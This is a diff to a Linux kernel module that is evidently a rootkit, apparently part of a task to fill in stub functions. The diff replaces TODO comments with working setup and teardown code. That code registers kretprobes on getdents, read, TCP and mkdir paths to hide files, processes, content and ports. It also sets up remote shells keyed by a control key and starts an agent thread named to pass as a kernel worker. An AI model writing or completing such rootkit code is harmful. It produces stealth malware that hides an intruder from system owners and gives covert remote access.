@@ -34,36 +34,90 @@ static struct task_struct *rk_thread;
 
 static int __init rk_init(void)
 {
-	/*
-	 * TODO: Full goto-rollback initialization chain.
-	 *
-	 * 1. Validate peer_port is set (reject with -EINVAL if 0).
-	 * 2. Validate control_key is exactly RK_KEY_HEX_LEN chars.
-	 * 3. hex2bin the key into rk_key, reject on failure.
-	 * 4. memzero_explicit the hex key buffer.
-	 * 5. rk_target_init all four target lists.
-	 * 6. rk_shells_init.
-	 * 7. Register all 6 kretprobes (getdents, read, tcp4, tcp6,
-	 *    mkdir, mkdirat) with goto-rollback on each failure.
-	 * 8. kthread_run(rk_agent_thread, ..., "kworker/u8:3").
-	 * 9. On thread failure, unregister probes in reverse order.
-	 * 10. On any failure, call rk_shells_cleanup and
-	 *     memzero_explicit the key.
-	 */
-	return -ENOSYS;
+	int ret;
+
+	if (!peer_port)
+		return -EINVAL;
+	if (strlen(rk_key_hex) != RK_KEY_HEX_LEN)
+		return -EINVAL;
+	if (hex2bin(rk_key, rk_key_hex, RK_KEY_LEN) < 0)
+		return -EINVAL;
+
+	memzero_explicit(rk_key_hex, sizeof(rk_key_hex));
+
+	rk_target_init(&rk_file_targets);
+	rk_target_init(&rk_pid_targets);
+	rk_target_init(&rk_content_targets);
+	rk_target_init(&rk_port_targets);
+	rk_shells_init();
+
+	ret = register_kretprobe(&rk_getdents_probe);
+	if (ret)
+		goto fail_getdents;
+
+	ret = register_kretprobe(&rk_read_probe);
+	if (ret)
+		goto fail_read;
+
+	ret = register_kretprobe(&rk_tcp4_probe);
+	if (ret)
+		goto fail_tcp4;
+
+	ret = register_kretprobe(&rk_tcp6_probe);
+	if (ret)
+		goto fail_tcp6;
+
+	ret = register_kretprobe(&rk_mkdir_probe);
+	if (ret)
+		goto fail_mkdir;
+
+	ret = register_kretprobe(&rk_mkdirat_probe);
+	if (ret)
+		goto fail_mkdirat;
+
+	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
+	if (IS_ERR(rk_thread)) {
+		ret = PTR_ERR(rk_thread);
+		rk_thread = NULL;
+		goto fail_thread;
+	}
+
+	return 0;
+
+fail_thread:
+	unregister_kretprobe(&rk_mkdirat_probe);
+fail_mkdirat:
+	unregister_kretprobe(&rk_mkdir_probe);
+fail_mkdir:
+	unregister_kretprobe(&rk_tcp6_probe);
+fail_tcp6:
+	unregister_kretprobe(&rk_tcp4_probe);
+fail_tcp4:
+	unregister_kretprobe(&rk_read_probe);
+fail_read:
+	unregister_kretprobe(&rk_getdents_probe);
+fail_getdents:
+	rk_shells_cleanup();
+	memzero_explicit(rk_key, sizeof(rk_key));
+	return ret;
 }
 
 static void __exit rk_exit(void)
 {
-	/*
-	 * TODO: Reverse-order teardown.
-	 *
-	 * 1. kthread_stop the agent thread.
-	 * 2. rk_uncloak (restore module visibility).
-	 * 3. Unregister all 6 kretprobes in reverse order.
-	 * 4. rk_shells_cleanup.
-	 * 5. memzero_explicit the key.
-	 */
+	if (rk_thread)
+		kthread_stop(rk_thread);
+
+	rk_uncloak();
+
+	unregister_kretprobe(&rk_mkdirat_probe);
+	unregister_kretprobe(&rk_mkdir_probe);
+	unregister_kretprobe(&rk_tcp6_probe);
+	unregister_kretprobe(&rk_tcp4_probe);
+	unregister_kretprobe(&rk_read_probe);
+	unregister_kretprobe(&rk_getdents_probe);
+
+	rk_shells_cleanup();
+	memzero_explicit(rk_key, sizeof(rk_key));
 }
 
 module_init(rk_init);
